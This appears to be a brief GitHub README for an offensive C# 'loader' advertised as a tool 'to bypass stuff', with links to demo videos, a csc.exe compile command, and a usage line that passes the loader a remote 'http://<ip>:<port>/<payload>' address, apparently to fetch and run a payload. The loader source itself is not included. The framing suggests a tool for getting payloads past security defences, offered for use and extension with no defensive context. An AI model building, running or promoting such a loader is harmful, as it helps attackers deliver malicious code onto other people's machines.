# loader
a loader to bypass stuff.
## Execution with Loader
https://github.com/user-attachments/assets/dfc99aad-7b4c-4378-94a7-f54217641113

## Execution without loader
https://github.com/user-attachments/assets/e42847ef-3596-4815-abb6-0702b9d7f873

## How to Compile
make sure you have visual studio 2022 installed. then open the cross tools command prompt for vs 2022 and enter: 

```cmd
csc.exe /t:exe /out:YourLoaderName.exe loader_final.cs
```

## Usage
```
taskOneLoader.exe -path "http://<ip>:<port>/<payload>"
```
you can also use this as boiler plate and add more stuff to it to make it cool. 
